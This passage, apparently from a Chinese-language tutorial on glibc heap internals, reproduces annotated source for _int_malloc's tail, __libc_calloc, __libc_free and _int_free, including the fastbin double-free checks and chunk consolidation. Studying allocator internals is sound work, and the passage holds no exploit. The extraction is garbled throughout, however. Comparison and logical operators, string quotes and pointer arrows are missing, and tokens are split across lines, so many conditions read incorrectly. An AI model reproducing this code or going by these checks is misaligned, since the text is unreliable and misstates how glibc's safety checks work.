\nMINSIZE\n))\n \n{\n\n            \nremainder_size\n \n=\n \nsize\n \n-\n \nnb\n;\n\n            \nremainder\n      \n=\n \nchunk_at_offset\n(\nvictim\n,\n \nnb\n);\n\n            \nav\n-\ntop\n        \n=\n \nremainder\n;\n\n            \n// \u8fd9\u91cc\u8bbe\u7f6e PREV_INUSE \u662f\u56e0\u4e3a top chunk \u7684 chunk \u5982\u679c\u4e0d\u662f fastbin\uff0c\u5c31\u5fc5\u7136\u4f1a\u548c\n\n            \n// top chunk \u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u8bbe\u7f6e\u4e86 PREV_INUSE\u3002\n\n            \nset_head\n(\nvictim\n,\n \nnb\n \n|\n \nPREV_INUSE\n \n|\n\n                                 \n(\nav\n \n!=\n \nmain_arena\n \n?\n \nNON_MAIN_ARENA\n \n:\n \n0\n));\n\n            \nset_head\n(\nremainder\n,\n \nremainder_size\n \n|\n \nPREV_INUSE\n);\n\n\n            \ncheck_malloced_chunk\n(\nav\n,\n \nvictim\n,\n \nnb\n);\n\n            \nvoid\n \n*\np\n \n=\n \nchunk2mem\n(\nvictim\n);\n\n            \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n            \nreturn\n \np\n;\n\n        \n}\n\n        \n// \u5426\u5219\uff0c\u5224\u65ad\u662f\u5426\u6709 fast chunk\n\n        \n/* When we are using atomic ops to free fast chunks we can get\n\n\n           here for all block sizes.  */\n\n        \nelse\n \nif\n \n(\nhave_fastchunks\n(\nav\n))\n \n{\n\n            \n// \u5148\u6267\u884c\u4e00\u6b21fast bin\u7684\u5408\u5e76\n\n            \nmalloc_consolidate\n(\nav\n);\n\n            \n/* restore original bin index */\n\n            \n// \u5224\u65ad\u9700\u8981\u7684chunk\u662f\u5728small bin\u8303\u56f4\u5185\u8fd8\u662flarge bin\u8303\u56f4\u5185\n\n            \n// \u5e76\u8ba1\u7b97\u5bf9\u5e94\u7684\u7d22\u5f15\n\n            \n// \u7b49\u5f85\u4e0b\u6b21\u518d\u770b\u770b\u662f\u5426\u53ef\u4ee5\n\n            \nif\n \n(\nin_smallbin_range\n(\nnb\n))\n\n                \nidx\n \n=\n \nsmallbin_index\n(\nnb\n);\n\n            \nelse\n\n                \nidx\n \n=\n \nlargebin_index\n(\nnb\n);\n\n        \n}\n\n\n        \n/*\n\n\n           Otherwise, relay to handle system-dependent cases\n\n\n         */\n\n        \n// \u5426\u5219\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ea\u80fd\u4ece\u7cfb\u7edf\u4e2d\u518d\u6b21\u7533\u8bf7\u4e00\u70b9\u5185\u5b58\u4e86\u3002\n\n        \nelse\n \n{\n\n            \nvoid\n \n*\np\n \n=\n \nsysmalloc\n(\nnb\n,\n \nav\n);\n\n            \nif\n \n(\np\n \n!=\n \nNULL\n)\n \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n            \nreturn\n \np\n;\n\n        \n}\n\n\n\n\n\n_libc_calloc\n\n\ncalloc \u4e5f\u662f libc \u4e2d\u7684\u4e00\u79cd\u7533\u8bf7\u5185\u5b58\u5757\u7684\u51fd\u6570\u3002\u5728 \nlibc\n\u4e2d\u7684\u5305\u88c5\u4e3a \n_libc_calloc\n\uff0c\u5177\u4f53\u4ecb\u7ecd\u5982\u4e0b\n\n\n/*\n\n\n  calloc(size_t n_elements, size_t element_size);\n\n\n  Returns a pointer to n_elements * element_size bytes, with all locations\n\n\n  set to zero.\n\n\n*/\n\n\nvoid\n*\n  \n__libc_calloc\n(\nsize_t\n,\n \nsize_t\n);\n\n\n\n\n\nsysmalloc\n\n\n\u6709\u65f6\u95f4\u7684\u65f6\u5019\u518d\u5206\u6790\u3002\n\n\n\u91ca\u653e\u5185\u5b58\u5757\n\n\n__libc_free\n\n\n\u7c7b\u4f3c\u4e8e malloc\uff0cfree \u51fd\u6570\u4e5f\u6709\u4e00\u5c42\u5c01\u88c5\uff0c\u547d\u540d\u683c\u5f0f\u4e0e malloc \u57fa\u672c\u7c7b\u4f3c\u3002\u4ee3\u7801\u5982\u4e0b\n\n\nvoid\n \n__libc_free\n(\nvoid\n \n*\nmem\n)\n \n{\n\n    \nmstate\n    \nar_ptr\n;\n\n    \nmchunkptr\n \np\n;\n \n/* chunk corresponding to mem */\n\n    \n// \u5224\u65ad\u662f\u5426\u6709\u94a9\u5b50\u51fd\u6570 __free_hook\n\n    \nvoid\n \n(\n*\nhook\n)(\nvoid\n \n*\n,\n \nconst\n \nvoid\n \n*\n)\n \n=\n \natomic_forced_read\n(\n__free_hook\n);\n\n    \nif\n \n(\n__builtin_expect\n(\nhook\n \n!=\n \nNULL\n,\n \n0\n))\n \n{\n\n        \n(\n*\nhook\n)(\nmem\n,\n \nRETURN_ADDRESS\n(\n0\n));\n\n        \nreturn\n;\n\n    \n}\n\n    \n// free NULL\u6ca1\u6709\u4f5c\u7528\n\n    \nif\n \n(\nmem\n \n==\n \n0\n)\n \n/* free(0) has no effect */\n\n        \nreturn\n;\n\n    \n// \u5c06mem\u8f6c\u6362\u4e3achunk\u72b6\u6001\n\n    \np\n \n=\n \nmem2chunk\n(\nmem\n);\n\n    \n// \u5982\u679c\u8be5\u5757\u5185\u5b58\u662fmmap\u5f97\u5230\u7684\n\n    \nif\n \n(\nchunk_is_mmapped\n(\np\n))\n \n/* release mmapped memory. */\n\n    \n{\n\n        \n/* See if the dynamic brk/mmap threshold needs adjusting.\n\n\n       Dumped fake mmapped chunks do not affect the threshold.  */\n\n        \nif\n \n(\n!\nmp_\n.\nno_dyn_threshold\n \n \nchunksize_nomask\n(\np\n)\n \n \nmp_\n.\nmmap_threshold\n \n\n            \nchunksize_nomask\n(\np\n)\n \n=\n \nDEFAULT_MMAP_THRESHOLD_MAX\n \n\n            \n!\nDUMPED_MAIN_ARENA_CHUNK\n(\np\n))\n \n{\n\n            \nmp_\n.\nmmap_threshold\n \n=\n \nchunksize\n(\np\n);\n\n            \nmp_\n.\ntrim_threshold\n \n=\n \n2\n \n*\n \nmp_\n.\nmmap_threshold\n;\n\n            \nLIBC_PROBE\n(\nmemory_mallopt_free_dyn_thresholds\n,\n \n2\n,\n\n                       \nmp_\n.\nmmap_threshold\n,\n \nmp_\n.\ntrim_threshold\n);\n\n        \n}\n\n        \nmunmap_chunk\n(\np\n);\n\n        \nreturn\n;\n\n    \n}\n\n    \n// \u6839\u636echunk\u83b7\u5f97\u5206\u914d\u533a\u7684\u6307\u9488\n\n    \nar_ptr\n \n=\n \narena_for_chunk\n(\np\n);\n\n    \n// \u6267\u884c\u91ca\u653e\n\n    \n_int_free\n(\nar_ptr\n,\n \np\n,\n \n0\n);\n\n\n}\n\n\n\n\n\n_int_free\n\n\n\u51fd\u6570\u521d\u59cb\u65f6\u523b\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u7684\u53d8\u91cf\uff0c\u5e76\u4e14\u5f97\u5230\u4e86\u7528\u6237\u60f3\u8981\u91ca\u653e\u7684 chunk \u7684\u5927\u5c0f\n\n\nstatic\n \nvoid\n \n_int_free\n(\nmstate\n \nav\n,\n \nmchunkptr\n \np\n,\n \nint\n \nhave_lock\n)\n \n{\n\n    \nINTERNAL_SIZE_T\n \nsize\n;\n      \n/* its size */\n\n    \nmfastbinptr\n \n*\n   \nfb\n;\n        \n/* associated fastbin */\n\n    \nmchunkptr\n       \nnextchunk\n;\n \n/* next contiguous chunk */\n\n    \nINTERNAL_SIZE_T\n \nnextsize\n;\n  \n/* its size */\n\n    \nint\n             \nnextinuse\n;\n \n/* true if nextchunk is used */\n\n    \nINTERNAL_SIZE_T\n \nprevsize\n;\n  \n/* size of previous contiguous chunk */\n\n    \nmchunkptr\n       \nbck\n;\n       \n/* misc temp for linking */\n\n    \nmchunkptr\n       \nfwd\n;\n       \n/* misc temp for linking */\n\n\n    \nconst\n \nchar\n \n*\nerrstr\n \n=\n \nNULL\n;\n\n    \nint\n         \nlocked\n \n=\n \n0\n;\n\n\n    \nsize\n \n=\n \nchunksize\n(\np\n);\n\n\n\n\n\n\u7b80\u5355\u7684\u68c0\u67e5\n\n\n    \n/* Little security check which won\nt hurt performance: the\n\n\n       allocator never wrapps around at the end of the address space.\n\n\n       Therefore we can exclude some size values which might appear\n\n\n       here by accident or by \ndesign\n from some intruder.  */\n\n    \n// \u6307\u9488\u4e0d\u80fd\u6307\u5411\u975e\u6cd5\u7684\u5730\u5740, \u5fc5\u987b\u5c0f\u4e8e\u7b49\u4e8e-size\uff0c\u4e3a\u4ec0\u4e48\uff1f\uff1f\uff1f\n\n    \n// \u6307\u9488\u5fc5\u987b\u5f97\u5bf9\u9f50\uff0c2*SIZE_SZ \u8fd9\u4e2a\u5bf9\u9f50\u5f97\u4ed4\u7ec6\u60f3\u60f3\n\n    \nif\n \n(\n__builtin_expect\n((\nuintptr_t\n)\n \np\n \n \n(\nuintptr_t\n)\n \n-\nsize\n,\n \n0\n)\n \n||\n\n        \n__builtin_expect\n(\nmisaligned_chunk\n(\np\n),\n \n0\n))\n \n{\n\n        \nerrstr\n \n=\n \nfree(): invalid pointer\n;\n\n    \nerrout\n:\n\n        \nif\n \n(\n!\nhave_lock\n \n \nlocked\n)\n \n__libc_lock_unlock\n(\nav\n-\nmutex\n);\n\n        \nmalloc_printerr\n(\ncheck_action\n,\n \nerrstr\n,\n \nchunk2mem\n(\np\n),\n \nav\n);\n\n        \nreturn\n;\n\n    \n}\n\n    \n/* We know that each chunk is at least MINSIZE bytes in size or a\n\n\n       multiple of MALLOC_ALIGNMENT.  */\n\n    \n// \u5927\u5c0f\u6ca1\u6709\u6700\u5c0f\u7684chunk\u5927\uff0c\u6216\u8005\u8bf4\uff0c\u5927\u5c0f\u4e0d\u662fMALLOC_ALIGNMENT\u7684\u6574\u6570\u500d\n\n    \nif\n \n(\n__glibc_unlikely\n(\nsize\n \n \nMINSIZE\n \n||\n \n!\naligned_OK\n(\nsize\n)))\n \n{\n\n        \nerrstr\n \n=\n \nfree(): invalid size\n;\n\n        \ngoto\n \nerrout\n;\n\n    \n}\n\n    \n// \u68c0\u67e5\u8be5chunk\u662f\u5426\u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528\n\n    \ncheck_inuse_chunk\n(\nav\n,\n \np\n);\n\n\n\n\n\n\u5176\u4e2d\n\n\n/* Check if m has acceptable alignment */\n\n\n\n#define aligned_OK(m) (((unsigned long) (m) \nMALLOC_ALIGN_MASK) == 0)\n\n\n\n#define misaligned_chunk(p)                                                    \\\n\n\n    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) \n       \\\n\n\n     MALLOC_ALIGN_MASK)\n\n\n\n\n\nfast bin\n\n\n\u5982\u679c\u4e0a\u8ff0\u68c0\u67e5\u90fd\u5408\u683c\u7684\u8bdd\uff0c\u5224\u65ad\u5f53\u524d\u7684 bin \u662f\u4e0d\u662f\u5728 fast bin \u8303\u56f4\u5185\uff0c\u5728\u7684\u8bdd\u5c31\u63d2\u5165\u5230 \nfastbin \u5934\u90e8\n\uff0c\u5373\u6210\u4e3a\u5bf9\u5e94 fastbin \u94fe\u8868\u7684\n\u7b2c\u4e00\u4e2a free chunk\n\u3002\n\n\n    \n/*\n\n\n      If eligible, place chunk on a fastbin so it can be found\n\n\n      and used quickly in malloc.\n\n\n    */\n\n\n    \nif\n \n((\nunsigned\n \nlong\n)\n \n(\nsize\n)\n \n=\n \n(\nunsigned\n \nlong\n)\n \n(\nget_max_fast\n())\n\n\n\n#if TRIM_FASTBINS\n\n        \n/*\n\n\n      If TRIM_FASTBINS set, don\nt place chunks\n\n\n      bordering top into fastbins\n\n\n        */\n\n       \n//\u9ed8\u8ba4 #define TRIM_FASTBINS 0\uff0c\u56e0\u6b64\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0b\u9762\u7684\u8bed\u53e5\u4e0d\u4f1a\u6267\u884c\n\n       \n// \u5982\u679c\u5f53\u524dchunk\u662ffast chunk\uff0c\u5e76\u4e14\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u5219\u4e0d\u80fd\u63d2\u5165\n\n        \n \n(\nchunk_at_offset\n(\np\n,\n \nsize\n)\n \n!=\n \nav\n-\ntop\n)\n\n\n#endif\n\n            \n)\n \n{\n\n        \n// \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e\u4e24\u500d\u7684SIZE_SZ,\u5e76\u4e14\n\n        \n// \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5927\u4e8esystem_mem\uff0c \u4e00\u822c\u4e3a132k\n\n        \n// \u5982\u679c\u51fa\u73b0\u8fd9\u6837\u7684\u60c5\u51b5\uff0c\u5c31\u62a5\u9519\u3002\n\n        \nif\n \n(\n__builtin_expect\n(\n\n                \nchunksize_nomask\n(\nchunk_at_offset\n(\np\n,\n \nsize\n))\n \n=\n \n2\n \n*\n \nSIZE_SZ\n,\n \n0\n)\n \n||\n\n            \n__builtin_expect\n(\n\n                \nchunksize\n(\nchunk_at_offset\n(\np\n,\n \nsize\n))\n \n=\n \nav\n-\nsystem_mem\n,\n \n0\n))\n \n{\n\n            \n/* We might not have a lock at this point and concurrent\n\n\n               modifications\n\n\n               of system_mem might have let to a false positive.  Redo the test\n\n\n               after getting the lock.  */\n\n            \nif\n \n(\nhave_lock\n \n||\n \n({\n\n                    \nassert\n(\nlocked\n \n==\n \n0\n);\n\n                    \n__libc_lock_lock\n(\nav\n-\nmutex\n);\n\n                    \nlocked\n \n=\n \n1\n;\n\n                    \nchunksize_nomask\n(\nchunk_at_offset\n(\np\n,\n \nsize\n))\n \n=\n \n2\n \n*\n \nSIZE_SZ\n \n||\n\n                        \nchunksize\n(\nchunk_at_offset\n(\np\n,\n \nsize\n))\n \n=\n \nav\n-\nsystem_mem\n;\n\n                \n}))\n \n{\n\n                \nerrstr\n \n=\n \nfree(): invalid next size (fast)\n;\n\n                \ngoto\n \nerrout\n;\n\n            \n}\n\n            \nif\n \n(\n!\nhave_lock\n)\n \n{\n\n                \n__libc_lock_unlock\n(\nav\n-\nmutex\n);\n\n                \nlocked\n \n=\n \n0\n;\n\n            \n}\n\n        \n}\n\n        \n// \u5c06chunk\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte \n\n        \nfree_perturb\n(\nchunk2mem\n(\np\n),\n \nsize\n \n-\n \n2\n \n*\n \nSIZE_SZ\n);\n\n        \n// \u8bbe\u7f6efast chunk\u7684\u6807\u8bb0\u4f4d\n\n        \nset_fastchunks\n(\nav\n);\n\n        \n// \u6839\u636e\u5927\u5c0f\u83b7\u53d6fast bin\u7684\u7d22\u5f15\n\n        \nunsigned\n \nint\n \nidx\n \n=\n \nfastbin_index\n(\nsize\n);\n\n        \n// \u83b7\u53d6\u5bf9\u5e94fastbin\u7684\u5934\u6307\u9488\uff0c\u88ab\u521d\u59cb\u5316\u540e\u4e3aNULL\u3002\n\n        \nfb\n               \n=\n \nfastbin\n(\nav\n,\n \nidx\n);\n\n\n        \n/* Atomically link P to its fastbin: P-\nFD = *FB; *FB = P;  */\n\n        \n// \u4f7f\u7528\u539f\u5b50\u64cd\u4f5c\u5c06P\u63d2\u5165\u5230\u94fe\u8868\u4e2d\n\n        \nmchunkptr\n    \nold\n     \n=\n \n*\nfb\n,\n \nold2\n;\n\n        \nunsigned\n \nint\n \nold_idx\n \n=\n \n~\n0u\n;\n\n        \ndo\n \n{\n\n            \n/* Check that the top of the bin is not the record we are going to\n\n\n               add\n\n\n               (i.e., double free).  */\n\n            \n// so we can not double free one fastbin chunk\n\n            \n// \u9632\u6b62\u5bf9 fast bin double free\n\n            \nif\n \n(\n__builtin_expect\n(\nold\n \n==\n \np\n,\n \n0\n))\n \n{\n\n                \nerrstr\n \n=\n \ndouble free or corruption (fasttop)\n;\n\n                \ngoto\n \nerrout\n;\n\n            \n}\n\n            \n/* Check that size of fastbin chunk at the top is the same as\n\n\n               size of the chunk that we are adding.  We can dereference OLD\n\n\n               only if we have the lock, otherwise it might have already been\n\n\n               deallocated.  See use of OLD_IDX below for the actual check.  */\n\n            \nif\n \n(\nhave_lock\n \n \nold\n \n!=\n \nNULL\n)\n\n                \nold_idx\n \n=\n \nfastbin_index\n(\nchunksize\n(\nold\n));\n\n            \np\n-\nfd\n \n=\n \nold2\n \n=\n \nold\n;\n\n        \n}\n \nwhile\n \n((\nold\n \n=\n \ncatomic_compare_and_exchange_val_rel\n(\nfb\n,\n \np\n,\n \nold2\n))\n \n!=\n\n                 \nold2\n);\n\n        \n// \u786e\u4fddfast bin\u7684\u52a0\u5165\u524d\u4e0e\u52a0\u5165\u540e\u76f8\u540c\n\n        \nif\n \n(\nhave_lock\n \n \nold\n \n!=\n \nNULL\n \n \n__builtin_expect\n(\nold_idx\n \n!=\n \nidx\n,\n \n0\n))\n \n{\n\n            \nerrstr\n \n=\n \ninvalid fastbin entry (free)\n;\n\n            \ngoto\n \nerrout\n;\n\n        \n}\n\n    \n}\n\n\n\n\n\n\u5408\u5e76\u975e mmap \u7684\u7a7a\u95f2 chunk\n\n\n\u53ea\u6709\u4e0d\u662f fast bin \u7684\u60c5\u51b5\u4e0b\u624d\u4f1a\u89e6\u53d1unlink\n\n\n\u9996\u5148\u6211\u4eec\u5148\u8bf4\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u4f1a\u5408\u5e76chunk\uff0c\u8fd9\u662f\u4e3a\u4e86\u907f\u514dheap\u4e2d\u6709\u592a\u591a\u96f6\u96f6\u788e\u788e\u7684\u5185\u5b58\u5757\uff0c\u5408\u5e76\u4e4b\u540e\u53ef\u4ee5\u7528\u6765\u5e94\u5bf9\u66f4\u5927\u7684\u5185\u5b58\u5757\u8bf7\u6c42\u3002\u5408\u5e76\u7684\u4e3b\u8981\u987a\u5e8f\u4e3a\n\n\n\n\n\u5148\u8003\u8651\u7269\u7406\u4f4e\u5730\u5740\u7a7a\u95f2\u5757\n\n\n\u540e\u8003\u8651\u7269\u7406\u9ad8\u5730\u5740\u7a7a\u95f2\u5757\n\n\n\n\n\u5408\u5e76\u540e\u7684 chunk \u6307\u5411\u5408\u5e76\u7684 chunk \u7684\u4f4e\u5730\u5740\u3002\n\n\n\u5728\u6ca1\u6709\u9501\u7684\u60c5\u51b5\u4e0b\uff0c\u5148\u83b7\u5f97\u9501\u3002\n\n\n    \n/*\n\n\n      Consolidate other non-mmapped chunks as they arrive.\n\n\n    */\n\n\n    \nelse\n \nif\n \n(\n!\nchunk_is_mmapped\n(\np\n))\n \n{\n\n        \nif\n \n(\n!\nhave_lock\n)\n \n{\n\n            \n__libc_lock_lock\n(\nav\n-\nmutex\n);\n\n            \nlocked\n \n=\n \n1\n;\n\n        \n}\n\n        \nnextchunk\n \n=\n \nchunk_at_offset\n(\np\n,\n \nsize\n);\n\n\n\n\n\n\u8f7b\u91cf\u7ea7\u7684\u68c0\u6d4b\n\n\n        \n/* Lightweight tests: check whether the block is already the\n\n\n           top block.  */\n\n        \n// \u5f53\u524dfree\u7684chunk\u4e0d\u80fd\u662ftop chunk\n\n        \nif\n \n(\n__glibc_unlikely\n(\np\n \n==\n \nav\n-\ntop\n))\n \n{\n\n            \nerrstr\n \n=\n \ndouble free or corruption (top)\n;\n\n            \ngoto\n \nerrout\n;\n\n        \n}\n\n        \n// \u5f53\u524dfree\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u4e0d\u80fd\u8d85\u8fc7arena\u7684\u8fb9\u754c\n\n        \n/* Or whether the next chunk is beyond the boundaries of the arena.  */\n\n        \nif\n \n(\n__builtin_expect\n(\ncontiguous\n(\nav\n)\n \n\n                                 \n(\nchar\n \n*\n)\n \nnextchunk\n \n=\n\n                                     \n((\nchar\n \n*\n)\n \nav\n-\ntop\n \n+\n \nchunksize\n(\nav\n-\ntop\n)),\n\n                             \n0\n))\n \n{\n\n            \nerrstr\n \n=\n \ndouble free or corruption (out)\n;\n\n            \ngoto\n \nerrout\n;\n\n        \n}\n\n        \n// \u5f53\u524d\u8981free\u7684chunk\u7684\u4f7f\u7528\u6807\u8bb0\u6ca1\u6709\u88ab\u6807\u8bb0\uff0cdouble free\n\n        \n/* Or whether the block is actually not marked used.  */\n\n        \nif\n \n(\n__glibc_unlikely\n(\n!\nprev_inuse\n(\nnextchunk\n)))\n \n{\n\n            \nerrstr\n \n=\n \ndouble free or corruption (!prev)\n;\n\n            \ngoto\n \nerrout\n;\n\n        \n}\n\n        \n// \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\n\n        \nnextsize\n \n=\n \nchunksize\n(\nnextchunk\n);\n\n        \n// next chunk size valid check\n\n        \n// \u5224\u65ad\u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u662f\u5426\u4e0d\u5927\u4e8e2*SIZE_SZ\uff0c\u6216\u8005\n\n        \n// nextsize\u662f\u5426\u5927\u4e8e\u7cfb\u7edf\u53ef\u63d0\u4f9b\u7684\u5185\u5b58\n\n        \nif\n \n(\n__builtin_expect\n(\nchunksize_nomask\n(\nnextchunk\n)\n \n=\n \n2\n \n*\n \nSIZE_SZ\n,\n \n0\n)\n \n||\n\n            \n__builtin_expect\n(\nnextsize\n \n=\n \nav\n-\nsystem_mem\n,\n \n0\n))\n \n{\n\n            \nerrstr\n \n=\n \nfree(): invalid next size (normal)\n;\n\n            \ngoto\n \nerrout\n;\n\n        \n}\n\n\n\n\n\n\u91ca\u653e\u586b\u5145\n\n\n        \n//\u5c06\u6307\u9488\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte \n\n        \nfree_perturb\n(\nchunk2mem\n(\np\n),\n \nsize\n \n-\n \n2\n \n*\n \nSIZE_SZ\n);\n\n\n\n\n\n\u540e\u5411\u5408\u5e76-\u5408\u5e76\u4f4e\u5730\u5740 chunk\n\n\n        \n/* consolidate backward */\n\n        \nif\n \n(\n!\nprev_inuse\n(\np\n))\n \n{\n\n            \nprevsize\n \n=\n \nprev_size\n(\np\n);\n\n            \nsize\n \n+=\n \nprevsize\n;\n\n            \np\n \n=\n \nchunk_at_offset\n(\np\n,\n \n-\n((\nlong\n)\n \nprevsize\n));\n\n            \nunlink\n(\nav\n,\n \np\n,\n \nbck\n,\n \nfwd\n);\n\n        \n}\n\n\n\n\n\n\u4e0b\u4e00\u5757\u4e0d\u662ftop chunk-\u524d\u5411\u5408\u5e76-\u5408\u5e76\u9ad8\u5730\u5740chunk\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u4e0b\u4e00\u5757\u4e0d\u662f top chunk \u540e\uff0c\u5219\u5408\u5e76\u9ad8\u5730\u5740\u7684 chunk \uff0c\u5e76\u5c06\u5408\u5e76\u540e\u7684 chunk \u653e\u5165\u5230unsorted bin\u4e2d\u3002\n\n\n        \n// \u5982\u679c\u4e0b\u4e00\u4e2achunk\u4e0d\u662ftop chunk\n\n        \nif\n \n(\nnextchunk\n \n!=\n \nav\n-\ntop\n)\n \n{\n\n            \n/* get and clear inuse bit */\n\n            \n// \u83b7\u53d6\u4e0b\u4e00\u4e2a chunk \u7684\u4f7f\u7528\u72b6\u6001\n\n            \nnextinuse\n \n=\n \ninuse_bit_at_offset\n(\nnextchunk\n,\n \nnextsize\n);\n\n            \n// \u5982\u679c\u4e0d\u5728\u4f7f\u7528\uff0c\u5408\u5e76\uff0c\u5426\u5219\u6e05\u7a7a\u5f53\u524dchunk\u7684\u4f7f\u7528\u72b6\u6001\u3002\n\n            \n/* consolidate forward */\n\n            \nif\n \n(\n!\nnextinuse\n)\n \n{\n\n                \nunlink\n(\nav\n,\n \nnextchunk\n,\n \nbck\n,\n \nfwd\n);\n\n                \nsize\n \n+=\n \nnextsize\n;\n\n            \n}\n \nelse\n\n                \nclear_inuse_bit_at_offset\n(\nnextchunk\n,\n \n0\n);\n\n\n            \n/*\n\n\n          Place the chunk in unsorted chunk list. Chunks are\n\n\n          not placed into regular bins until after they have\n\n\n          been given one chance to be used in malloc.\n\n\n            */\n\n            \n// \u628a chunk \u653e\u5728 unsorted chunk \u94fe\u8868\u7684\u5934\u90e8\n\n            \nbck\n \n=\n \nunsorted_chunks\n(\nav\n);\n\n            \nfwd\n \n=\n \nbck\n-\nfd\n;\n\n            \n// \u7b80\u5355\u7684\u68c0\u67e5\n\n            \nif\n \n(\n__glibc_unlikely\n(\nfwd\n-\nbk\n \n!=\n \nbck\n))\n \n{\n\n                \nerrstr\n \n=\n \nfree(): corrupted unsorted chunks\n;\n\n                \ngoto\n \nerrout\n;\n\n            \n}\n\n            \np\n-\nfd\n \n=\n \nfwd\n;\n\n            \np\n-\nbk\n \n=\n \nbck\n;\n\n            \n// \u5982\u679c\u662f large chunk\uff0c\u90a3\u5c31\u8bbe\u7f6enextsize\u6307\u9488\u5b57\u6bb5\u4e3aNULL\u3002\n\n            \nif\n \n(\n!\nin_smallbin_range\n(\nsize\n))\n \n{\n\n                \np\n-\nfd_nextsize\n \n=\n \nNULL\n;\n\n                \np\n-\nbk_nextsize\n \n=\n \nNULL\n;\n\n            \n}\n\n            \nbck\n-\nfd\n \n=\n \np\n;\n\n            \nfwd\n-\nbk\n \n=\n \np\n;\n\n\n            \nset_head\n(\np\n,\n \nsize\n \n|\n \nPREV_INUSE\n);\n\n            \nset_foot\n(\np\n,\n \nsize\n);\n\n\n            \ncheck_free_chunk\n(\nav\n,\n \np\n);\n\n        \n}\n\n\n\n\n\n\u4e0b\u4e00\u5757\u662ftop chunk-\u5408\u5e76\u5230top chunk\n\n\n        \n/*\n\n\n          If the chunk borders the current high end of memory,\n\n\n          consolidate into top\n\n\n        */\n\n        \n// \u5982\u679c\u8981\u91ca\u653e\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u90a3\u5c31\u5408\u5e76\u5230 top chunk\n\n        \nelse\n \n{\n\n            \nsize\n \n+=\n \nnextsize\n;\n\n            \nset_head\n(\np\n,\n \nsize\n \n|\n \nPREV_INUSE\n);\n\n            \nav\n-\ntop\n \n=\n \np\n;\n\n            \ncheck_chunk\n(\nav\n,\n \np\n);\n\n        \n}\n\n\n\n\n\n\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58\n\n\n        \n/*\n\n\n          If freeing a large space, consolidate possibly-surrounding\n\n\n          chunks. Then, if the total unused topmost memory exceeds trim\n\n\n          threshold, ask malloc_trim to reduce top.\n\n\n\n          Unless max_fast is 0, we don\nt know if there are fastbins\n\n\n          bordering top, so we cannot tell for sure whether threshold\n\n\n          has been reached unless fastbins are consolidated.  But we\n\n\n          don\nt want to consolidate on each free.  As a compromise,\n\n\n          consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD\n\n\n          is reached.\n\n\n        */\n\n         \n// \u5982\u679c\u5408\u5e76\u540e\u7684 chunk \u7684\u5927\u5c0f\u5927\u4e8eFASTBIN_CONSOLIDATION_THRESHOLD\n\n         \n// \u4e00\u822c\u5408\u5e76\u5230 top chunk \u90fd\u4f1a\u6267\u884c\u8fd9\u90e8\u5206\u4ee3\u7801\u3002\n\n         \n// \u90a3\u5c31\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58\n\n        \nif\n \n((\nunsigned\n \nlong\n)\n \n(\nsize\n)\n \n=\n \nFASTBIN_CONSOLIDATION_THRESHOLD\n)\n \n{\n\n            \n// \u5982\u679c\u6709 fast chunk \u5c31\u8fdb\u884c\u5408\u5e76\n\n            \nif\n \n(\nhave_fastchunks\n(\nav\n))\n \nmalloc_consolidate\n(\nav\n);\n\n            \n// \u4e3b\u5206\u914d\u533a\n\n            \nif\n \n(\nav\n \n==\n \nmain_arena\n)\n \n{\n\n\n#ifndef MORECORE_CANNOT_TRIM\n\n                \n// top chunk \u5927\u4e8e\u5f53\u524d\u7684\u6536\u7f29\u9619\u503c\n\n                \nif\n \n((\nunsigned\n \nlong\n)\n \n(\nchunksize\n(\nav\n-\ntop\n))\n \n=\n\n                    \n(\nunsigned\n \nlong\n)\n \n(\nmp_\n.\ntrim_threshold\n))\n\n                    \nsystrim\n(\nmp_\n.\ntop_pad\n,\n \nav\n);\n\n\n#endif      \n// \u975e\u4e3b\u5206\u914d\u533a\uff0c\u5219\u76f4\u63a5\u6536\u7f29heap\n\n            \n}\n \nelse\n \n{\n\n                \n/* Always try heap_trim(), even if the top chunk is not\n\n\n                   large, because the corresponding heap might go away.  */\n\n                \nheap_info\n \n*\nheap\n \n=\n \nheap_for_ptr\n(\ntop\n(\nav\n));\n\n\n                \nassert\n(\nheap\n-\nar_ptr\n \n==\n \nav\n);\n\n                \nheap_trim\n(\nheap\n,\n \nmp_\n.\ntop_pad\n);\n\n            \n}\n\n        \n}\n\n\n        \nif\n \n(\n!\nhave_lock\n)\n \n{\n\n            \nassert\n(\nlocked\n);\n\n            \n__libc_lock_unlock\n(\nav\n-\nmutex\n);\n\n        \n}\n\n\n\n\n\n\u91ca\u653emmap\u7684chunk\n\n\n    \n}\n \nelse\n \n{\n\n        \n//  If the chunk was allocated via mmap, release via munmap().\n\n        \nmunmap_chunk\n(\np\n);\n\n    \n}\n\n\n\n\n\nsystrim\n\n\nheap_trim\n\n\nmunmap_chunk\n\n\n\u5220\u9664\u5806\n\n\nmalloc_state \u76f8\u5173\u51fd\u6570\n\n\nmalloc_init_state\n\n\n/*\n\n\n   Initialize a malloc_state struct.\n\n\n   This is called only from within malloc_consolidate, which needs\n\n\n   be called in the same contexts anyway.  It is never called directly\n\n\n   outside of malloc_consolidate because some optimizing compilers try\n\n\n   